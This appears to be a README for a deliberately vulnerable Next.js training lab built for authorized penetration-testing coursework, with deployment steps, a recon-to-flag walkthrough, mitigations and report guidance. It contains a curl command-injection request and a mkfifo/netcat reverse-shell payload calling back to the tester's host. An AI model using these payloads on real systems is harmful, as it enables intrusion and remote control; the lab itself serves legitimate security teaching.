# corp-website-lab

A deliberately vulnerable "corporate website" training target, built to
recreate the **vulnerability class** behind the TryHackme
*Corp Website 2026* writeup (an unauthenticated server-action-style RCE,
nicknamed "react2shell" / CVE-2025-55182 in that writeup) — for use in your
own authorized VAPT coursework.

This is an original recreation, not a copy of TryHackme's box or writeup
content. The vulnerable code here is written from scratch to be exploitable
the same *way* (recon → leaked action reference → unauthenticated RCE →
reverse shell → user flag), so your assessment steps and report transfer
cleanly, without redistributing anyone else's proprietary lab files.

**Only attack this on infrastructure you own or are explicitly authorized to
test.** Don't point any of the exploitation steps below at TryHackme's
actual platform or any system you don't control.

## What's inside

- A Next.js corporate site ("NexaCorp Solutions") on port 3000 — Home,
  About, Services, Contact.
- A static JS "build artifact" at
  `/_internal/chunks/fd5f064b2a3f9309.js` that leaks an internal action
  reference — the recon hook, standing in for the real writeup's discovery
  of a chunk under `/_next/static/chunks/`.
- An unauthenticated API route, `POST /api/render-action`, that trusts that
  leaked reference instead of real authn/authz, and runs an
  attacker-supplied shell command. Root cause:
  - **CWE-284** Improper Access Control (no auth check on a privileged action)
  - **CWE-78** OS Command Injection (attacker string reaches a shell)
  - Maps to **OWASP A01:2021 – Broken Access Control** and
    **A03:2021 – Injection**
- A non-root `daniel` account inside the container with `/home/daniel/user.txt`
  as the flag to retrieve — exploitation stops there, by design, no
  privilege-escalation path is included.

## Deploy

```bash
cd corp-website-lab
docker compose up --build -d
```

The site is then at `http://localhost:3000` (or `http://<host-ip>:3000` from
another machine on your network).

To stop/remove:

```bash
docker compose down
```

## Walkthrough (for your own assessment)

### 1. Recon
```bash
nmap -sV -Pn -sC <target-ip>
ffuf -u http://<target-ip>/FUZZ -w <wordlist> -recursion
```
Reviewing page source/JS reveals `/_internal/chunks/fd5f064b2a3f9309.js`,
which contains the internal action reference `7f3a9c2e4b1d6a90`.

### 2. Confirm RCE
```bash
curl -s -X POST http://<target-ip>:3000/api/render-action \
  -H "Content-Type: application/json" \
  -d '{"id":"7f3a9c2e4b1d6a90","args":["id"]}'
```
Expect a JSON body whose `result` field shows `uid=1000(daniel) ...`,
confirming unauthenticated command execution as `daniel`.

### 3. Reverse shell
On your attacker machine:
```bash
nc -lvnp 4444
```
Then:
```bash
curl -s -X POST http://<target-ip>:3000/api/render-action \
  -H "Content-Type: application/json" \
  -d '{"id":"7f3a9c2e4b1d6a90","args":["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-ip> 4444 >/tmp/f"]}'
```
You should get an interactive shell as `daniel`.

### 4. User flag
```bash
cat /home/daniel/user.txt
```

## Next steps for your assignment (Steps 2–5)

Once you've confirmed the above against *your own* running container:

- **Step 2 – Vulnerability assessment:** run Nmap + one more tool (Nuclei,
  Nikto, OWASP ZAP) against your local deployment, manually validate every
  finding, discard false positives, and map each real one to an OWASP/CWE
  (this app's intentional bug is pre-mapped above; anything else the
  scanners flag — e.g. missing security headers, verbose Next.js dev
  banners — is real and worth including too).
- **Step 3 – Exploitation & PoC:** document the curl/PoC above with
  screenshots of each response, plus the reverse-shell session; explain in
  your own words why trusting a client-supplied action id as the sole
  access check (instead of session-based authz) allows this.
- **Step 4 – Criticality & mitigation:** CVSS v3.1 for this bug lands in the
  **Critical** range (unauthenticated, network-exploitable, full command
  execution) — score it yourself with the calculator to get your own
  vector string. Mitigations: require authenticated, authorized sessions
  for any server-action dispatch; never gate execution on a client-supplied
  ID; validate/allowlist any command or argument server-side; least-privilege
  the running user (already done here — it's non-root).
- **Step 5 – Report:** write the VAPT report (executive summary, scope,
  methodology, findings table, exploitation steps + evidence, mitigation +
  retest) using this lab as your evidence trail. Happy to help you draft
  that report once you've run the scans/exploit and have your own
  screenshots and scan output.
